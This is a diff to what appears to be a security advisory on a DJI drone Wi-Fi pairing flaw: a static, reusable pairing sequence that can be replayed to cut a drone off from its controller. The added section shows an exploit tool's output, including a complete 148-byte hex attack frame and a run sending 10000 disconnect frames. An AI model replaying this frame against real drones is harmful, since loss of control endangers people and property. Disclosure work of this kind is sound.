@@ -14,6 +14,8 @@ Once the WEP key is recovered, an attacker within wireless range can inject craf
 ## Details
 During analysis of the Enhanced Wi-Fi pairing process, a static pairing byte sequence was identified. This sequence is not device-unique and can be reused across other DJI drones using the same protocol. When decrypted, the sequence can be re-encrypted and replayed to forcibly terminate the connection between a drone and its legitimate remote controller.
 
+![Connect Frame](1.png)
+
 ## Impact
 * __Denial of Service (DoS):__ Loss of control and telemetry between drone and RC
 * __Unauthenticated:__ No prior pairing or authentication required beyond possession of the WEP key
@@ -24,6 +26,26 @@ During analysis of the Enhanced Wi-Fi pairing process, a static pairing byte seq
 
 ```bash
 ./exploit
+```
+
+```
+$ ./exploit
+/*******************************************************
+ *                 DJI - CatNect
+ *
+ *                     /\_/\
+ *                    ( ･ω･ )
+ *                    /つ♡ ⊂\
+ *                   (  / \\ )
+ *
+ *        Taking down drones with love <3
+ *******************************************************/
+final_packet (148 bytes):
+000010002c0000000c007109c020ee000840000034d262296fc234d262296c1c38d262296fc2100000000100ae5c169c6db829e6251e7fb4148e07023639fda167d4000844259c5cb6acff85730e8ce27a01841bad02d0f0fb8dc6ff2aa2b0caa62acc44ba1fbedb8881ad10d00ceae89befb63b312fc6357727757391a8aed3ca5cb90279bfb2e8aa9c0fa121255d4b229698c2
+Press ENTER to launch attack (send 10000 frames on mon0)...
+
+[*] Sending 10000 disconnect frames on mon0...
+[*] Done sending disconnect frames.
 ```
 
 ## Video
